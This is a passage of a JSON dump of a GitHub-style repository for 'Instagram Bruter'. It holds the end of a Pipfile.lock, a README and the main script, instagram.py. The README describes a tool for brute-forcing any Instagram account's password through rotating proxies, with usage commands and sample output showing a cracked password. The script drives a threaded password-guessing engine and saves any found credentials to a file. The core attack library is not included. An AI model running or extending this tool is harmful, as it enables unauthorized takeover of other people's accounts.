\"sha256:9c1f62ee2ba880e221bc950651a1a4b0176083d70a066c83a50ef0cb9b178e12\",\n                \"sha256:9faa01818dad9111dbf2af26c6e3c45140ccbd1192c3a0981f196255bf7ec5e6\",\n                \"sha256:a58d21dd1a2d6b50ed091554ff85e448fce3fe33a4db8b55d0eba2ca957ed626\",\n                \"sha256:a8a08ace913c4101f0dc0be605c108a3761842efd5f41a3005565ee5d169fb2b\",\n                \"sha256:b2932e728bee0a634fe55ee54d598054a5a9ffe4cd2be21ba2b4b8e5f8064c2c\",\n                \"sha256:b5f759a1726b995dc896e86f17f9c0582b54eb4ead00ed5ef0b5b22260eaf2d0\",\n                \"sha256:bc635ab319c9b515236bdf327530acda99be995f9d3b9f148ab1f60b2431e970\",\n                \"sha256:be456b4313a86be41706319c397c09d9fdd2e5cdfde208292a277b867e99e3d1\",\n                \"sha256:be57f9c7b0b423c66c266a26ad143b2c5514997c05dd32ce7ca95c8b209c2288\",\n                \"sha256:c1ea28f0ee6cbe4c0367c939b015d915aa9875f6e061ba1cf0796ca9a3010570\",\n                \"sha256:c3db393b21b53d7e1d3f881b64c29d886cbfdd3df007e31de68b329edbab7d02\",\n                \"sha256:c400dfed4137f32127ea4063447006d7153c974c680bf0fb1b724cce9f8567fc\",\n                \"sha256:c5429202bef174a3760690d912e3a80060b323199a61cef6c6c29b30ce09fd17\",\n                \"sha256:c5eac5d8a8ac9ccf00805d02a968a36f5c967db6c7d2b747ab9ed782b3b3a28b\",\n                \"sha256:c757f3a27b6345de13ef3ca956aa805d7734ce68023e84d0fc74e1f09ce66f7a\",\n                \"sha256:ceff75127f828dfe7ceb17b94113ec2df4df274c4cd5533bb299cb099a18a8ca\",\n                \"sha256:cff5c87e941292c97d11dc81bd20679f56a2830f0f0e32f75b8ed6e0eb40f704\",\n                \"sha256:d70596f20a03cb5f935d6e4aad9170a490d88fc4633679bf00c652e9def4619e\",\n                \"sha256:e7b2ff451f6c305b516281ec45425dd423223c8063218c5310d6f72a0a7a517c\",\n                \"sha256:e85b10280cf1e334a7c95629f6cbbfe30b815a4ea5f1e28d31f79eb92c2c3d93\",\n                \"sha256:ecd2b5d983eb0adf2049d41f95205bdc3de4e6cc2350e9c80d4409d3a75229de\",\n                \"sha256:ed657a07d8a47ef447224ea00478f1c7095065dfe70a89e7280e5f50a5725131\",\n                \"sha256:f43522fb5d676c99282ca4e2d41e8e2388427c0cf703db6b4a66e49b10b699a8\",\n                \"sha256:f57823f35b18d82b201c1b27ce4e55f88e79e81d9ca07b50ce625d33823e1439\",\n                \"sha256:f7b43acb2c46fb2cd506965b2d9cf4c5e64c9c612bac26c1187933c7296bf08c\",\n                \"sha256:fa7c7044aabdad2329974be2246babcc21d3ede852b3971a90fd8c2056c20360\",\n                \"sha256:fcd7c432202bcb8b642c3f43d5bcafc5930d82fe5b2bf2c008162df258445c1d\",\n                \"sha256:fdecb225d0f1d50d4b26ac423e0032e76d46a788b83b4e299a520717a47d968c\",\n                \"sha256:ffef4b30785dc2d1604dfb7cf9fca5dc27cd86d65f7c2a9ec34d6d3ae4565ec2\"\n            ],\n            \"markers\": \"python_version >= '3.6'\",\n            \"version\": \"==2022.6.2\"\n        },\n        \"tomli\": {\n            \"hashes\": [\n                \"sha256:05b6166bff487dc068d322585c7ea4ef78deed501cc124060e0f238e89a9231f\",\n                \"sha256:e3069e4be3ead9668e21cb9b074cd948f7b3113fd9c8bba083f48247aab8b11c\"\n            ],\n            \"markers\": \"python_version >= '3.6'\",\n            \"version\": \"==1.2.3\"\n        },\n        \"typing-extensions\": {\n            \"hashes\": [\n                \"sha256:25642c956049920a5aa49edcdd6ab1e06d7e5d467fc00e0506c44ac86fbfca02\",\n                \"sha256:e6d2677a32f47fc7eb2795db1dd15c1f34eff616bcaf2cfb5e997f854fa1c4a6\"\n            ],\n            \"markers\": \"python_version >= '3.7'\",\n            \"version\": \"==4.3.0\"\n        }\n    }\n}\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 2.951171875,
          "content": "# Instagram Bruter\n\n[![Version](https://img.shields.io/badge/Version-3.1.0-green)]()\n[![Python](https://img.shields.io/badge/Python-v3.9-yellow)]()\n[![Discord](https://img.shields.io/badge/Discord-server-blue)](https://discord.gg/VYRAZg5)\n[![Donate](https://img.shields.io/badge/PayPal-donate-orange)](https://www.paypal.me/Msheikh03)\n\nThis program will brute force any Instagram account you send it its way given a list of proxies.\n\n### NOTICE\n\n~~I'm no longer maintaining this project.~~\n\n### Support\n\nIt motivates me to keep updating this program.\n\n> **Bitcoin Wallet:** 3Kr5C9t9HWwPfqzSNXeBNyRvJWw9sSLeKy<br/>\n> **PayPal:** https://www.paypal.me/Msheikh03\n\n## Requirements\n\n- Python _v3.9_\n- proxy list\n\n## Install Dependencies\n\n### Install Pipenv\n\n```\npip install pipenv\n```\n\n### Create environment\n\nMake sure you have Python 3.9 installed\n\n```\npipenv --python 3.9\n```\n\n### Install Requirements\n\n```\npipenv install\n```\n\n## Help\n\n```\nusage: instagram.py [-h] [-u USERNAME] [-p PASSLIST] [-px PROXYLIST] [--prune PRUNE] [--stats] [-nc] [-m MODE]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -u USERNAME, --username USERNAME\n                        email or username\n  -p PASSLIST, --passlist PASSLIST\n                        password list\n  -px PROXYLIST, --proxylist PROXYLIST\n                        proxy list\n  --prune PRUNE         prune the database\n  --stats               get statistics of the proxies\n  -nc, --no-color       disable colors\n  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots\n```\n\n## Proxies\n\nThe system needs a list of proxies to work. Once uploaded, proxies are saved into a database.<br/>\n\n### Upload\n\nUpload a list of proxies into the program. The proxy file must have a format of `ip:port`<br/>\n\n`proxies_list.txt`\n\n```\n3.238.111.248:80\n206.189.59.192:8118\n165.22.81.30:34100\n176.248.120.70:3128\n191.242.178.209:3128\n180.92.194.235:80\n```\n\nTo upload a list of proxies a similar syntax must be followed.\n\n```\npython instagram.py -px <path to proxy list>\n```\n\n### Stats\n\nThis gives an insight into the health of the proxies in the database.\n\n```\npython instagram.py --stats\n```\n\n### Prune\n\nThis allows the able to get rid of proxies with a score below a given score.<br/>\nIt is recommended that you run the `--stats` and prune the database of proxies<br/>\nwho have a proxy score below `Q1`.\n\n```\npython instagram.py --prune 0.05\n```\n\nPruning is not a requirement because the <br/>\nthe system will automatically learn which proxies perform poorly and stop using them.\n\n### Usage\n\n```\npython instagram.py -u <username> -p <passlist>\n```\n\n### Run\n\n```\n[-] Wordlist: passlist.txt\n[-] Username: Sami09.1\n[-] Password: 272\n[-] Complete: 45.51%\n[-] Attempts: 228\n[-] Browsers: 273\n[-] Exists: True\n```\n\n### Stop\n\n```\n[-] Wordlist: passlist.txt\n[-] Username: Sami09.1\n[-] Password: Sami123\n[-] Complete: 62.67%\n[-] Attempts: 314\n[-] Browsers: 185\n[-] Exists: True\n\n[!] Password Found\n[+] Username: Sami09.1\n[+] Password: Sami123\n```\n"
        },
        {
          "name": "instagram.py",
          "type": "blob",
          "size": 7.390625,
          "content": "# Date: 12/29/2018\r\n# Author: Mohamed\r\n# Description: Instagram bruter\r\n\r\n# from lib.proxy import Proxy\r\nimport os\r\nimport time\r\nfrom sys import exit\r\nfrom lib import database\r\nfrom lib.proxy_manager import ProxyManager\r\n\r\n# from os.path import exists\r\nfrom lib.bruter import Bruter\r\nfrom lib.display import Display\r\nfrom platform import python_version\r\n\r\nfrom lib.const import credentials, modes\r\nfrom argparse import ArgumentParser, ArgumentTypeError\r\n\r\n\r\nclass Engine(object):\r\n    def __init__(self, username, threads, passlist_path, is_color):\r\n        self.resume = False\r\n        self.is_alive = True\r\n        self.threads = threads\r\n        self.username = username\r\n        self.passlist_path = passlist_path\r\n        self.display = Display(is_color=is_color)\r\n        self.bruter = Bruter(username, threads, passlist_path)\r\n\r\n    def get_user_resp(self):\r\n        return self.display.prompt(\r\n            \"Would you like to resume the attack? [y/N]: \"\r\n        )\r\n\r\n    def write_to_file(self, password):\r\n        with open(credentials, \"at\") as f:\r\n            data = \"Username: {}\\nPassword: {}\\n\\n\".format(\r\n                self.username.title(), password\r\n            )\r\n            f.write(data)\r\n\r\n    def start(self):\r\n\r\n        while self.is_alive and not self.bruter.password_manager.session:\r\n            pass\r\n\r\n        if not self.is_alive:\r\n            return\r\n\r\n        if self.bruter.password_manager.session.exists:\r\n            try:\r\n                resp = self.get_user_resp()\r\n            except:\r\n                self.is_alive = False\r\n\r\n            if resp and self.is_alive:\r\n                if resp.strip().lower() == \"y\":\r\n                    self.bruter.password_manager.resume = True\r\n\r\n        try:\r\n            self.bruter.start()\r\n        except KeyboardInterrupt:\r\n            self.bruter.stop()\r\n            self.bruter.display.shutdown(\r\n                self.bruter.last_password,\r\n                self.bruter.password_manager.attempts,\r\n                len(self.bruter.browsers),\r\n            )\r\n        finally:\r\n            self.stop()\r\n\r\n    def stop(self):\r\n        if self.is_alive:\r\n\r\n            self.bruter.stop()\r\n            self.is_alive = False\r\n\r\n            if (\r\n                self.bruter.password_manager.is_read\r\n                and not self.bruter.is_found\r\n                and not self.bruter.password_manager.list_size\r\n            ):\r\n                self.bruter.display.stats_not_found(\r\n                    self.bruter.last_password,\r\n                    self.bruter.password_manager.attempts,\r\n                    len(self.bruter.browsers),\r\n                )\r\n\r\n            if self.bruter.is_found:\r\n                self.write_to_file(self.bruter.password)\r\n                self.bruter.display.stats_found(\r\n                    self.bruter.password,\r\n                    self.bruter.password_manager.attempts,\r\n                    len(self.bruter.browsers),\r\n                )\r\n\r\n\r\ndef valid_int(n):\r\n    if not n.isdigit():\r\n        raise ArgumentTypeError(\"mode must be a number\")\r\n\r\n    n = int(n)\r\n\r\n    if n > 3:\r\n        raise ArgumentTypeError(\"maximum for a mode is 3\")\r\n\r\n    if n < 0:\r\n        raise ArgumentTypeError(\"minimum for a mode is 0\")\r\n\r\n    return n\r\n\r\n\r\ndef valid_float(n):\r\n\r\n    err_msg = \"prune must be a value between 0 and 1\"\r\n\r\n    try:\r\n        n = float(n)\r\n    except ValueError:\r\n        raise ArgumentTypeError(err_msg)\r\n\r\n    if n < 0 or n > 1:\r\n        raise ArgumentTypeError(err_msg)\r\n\r\n    return n\r\n\r\n\r\ndef args():\r\n    args = ArgumentParser()\r\n    args.add_argument(\"-u\", \"--username\", help=\"email or username\")\r\n    args.add_argument(\"-p\", \"--passlist\", help=\"password list\")\r\n    args.add_argument(\"-px\", \"--proxylist\", help=\"proxy list\")\r\n    args.add_argument(\r\n        \"--prune\",\r\n        default=-1,\r\n        type=valid_float,\r\n        help=\"prune the database\",\r\n    )\r\n    args.add_argument(\r\n        \"--stats\", action=\"store_true\", help=\"get statistics of the proxies\"\r\n    )\r\n\r\n    args.add_argument(\r\n        \"-nc\",\r\n        \"--no-color\",\r\n        dest=\"color\",\r\n        action=\"store_true\",\r\n        help=\"disable colors\",\r\n    )\r\n    args.add_argument(\r\n        \"-m\",\r\n        \"--mode\",\r\n        default=2,\r\n        type=valid_int,\r\n        help=\"modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots\",\r\n    )\r\n\r\n    # ----------- #\r\n\r\n    arguments = args.parse_args()\r\n    username = arguments.username\r\n    passlist = arguments.passlist\r\n    proxylist = arguments.proxylist\r\n    prune = arguments.prune\r\n    stats = arguments.stats\r\n    prune_db = prune > 0\r\n\r\n    if not (prune_db or stats or proxylist) and not (username and passlist):\r\n        args.print_help()\r\n        exit()\r\n\r\n    return args.parse_args()\r\n\r\n\r\ndef prune_database(prune: float) -> None:\r\n    score = prune * 100\r\n\r\n    if (\r\n        input(\r\n            \"Are you sure you want to prune the database of proxies? [y/N]: \"\r\n        )\r\n        == \"y\"\r\n    ):\r\n\r\n        print(\r\n            f\"\\n<<< Pruning the database of all proxies with a score of {score}% or less >>>\"\r\n        )\r\n        time.sleep(0.65)\r\n\r\n        print(\r\n            f\"Pruned the database of {database.Proxy().prune(prune)} proxies\"\r\n        )\r\n        time.sleep(0.65)\r\n    else:\r\n        print(\"Pruning cancelled\")\r\n\r\n\r\ndef display_database_stats():\r\n    data = database.Proxy().stats()\r\n\r\n    place = 5\r\n\r\n    q1 = round(data[\"q1\"], place)\r\n    avg = round(data[\"avg\"], place)\r\n    min = round(data[\"min\"], place)\r\n    max = round(data[\"max\"], place)\r\n    total = data[\"total\"]\r\n    health = (\r\n        \"Dead\"\r\n        if avg == 0\r\n        else \"Very-ill\"\r\n        if avg <= 0.10\r\n        else \"Ill\"\r\n        if avg <= 0.30\r\n        else \"Somewhat-ill\"\r\n        if avg <= 0.50\r\n        else \"Normal\"\r\n        if avg <= 0.70\r\n        else \"Healthy\"\r\n        if avg <= 0.9\r\n        else \"Very-healthy\"\r\n    )\r\n    print(f\"\\nTotal Proxies: {total}\\nDatabase's Health: {health}\")\r\n    print(\r\n        f\"Q1: {q1} :: Avg Score: {avg}  ::  Min Score: {min}  ::  Max Score: {max}\"\r\n    )\r\n    time.sleep(0.65)\r\n\r\n\r\ndef main():\r\n    arguments = args()\r\n    mode = arguments.mode\r\n    username = arguments.username\r\n    passlist = arguments.passlist\r\n    proxylist = arguments.proxylist\r\n    prune = arguments.prune\r\n    stats = arguments.stats\r\n    prune_db = prune > 0\r\n\r\n    if prune_db > 0 or stats:\r\n        if prune_db > 0:\r\n            prune_database(prune)\r\n        if stats:\r\n            display_database_stats()\r\n    else:\r\n        if proxylist:\r\n            if not os.path.exists(proxylist):\r\n                print(\"Invalid path to proxy list\")\r\n                exit()\r\n\r\n            print(f\"<<< Writing proxies to the database >>>\")\r\n            time.sleep(0.65)\r\n\r\n            total_written = ProxyManager().write2db(proxylist)\r\n\r\n            print(f\"Proxies written to the database: {total_written}\")\r\n            time.sleep(0.65)\r\n\r\n        total_proxies = len(database.Proxy().get_proxies())\r\n\r\n        if username and passlist and total_proxies:\r\n\r\n            if not os.path.exists(passlist):\r\n                print(\"Invalid path to password list\")\r\n                exit()\r\n\r\n            Engine(\r\n                username, modes[mode], passlist, not arguments.color\r\n            ).start()\r\n\r\n        else:\r\n            if not proxylist or total_proxies == 0:\r\n                print(\"No proxies in the database and no proxy list provided\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n\r\n    if int(python_version()[0]) < 3:\r\n        print(\"[!] Please use Python 3\")\r\n        exit()\r\n\r\n    main()\r\n"
        },
        {
          "name": "lib",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}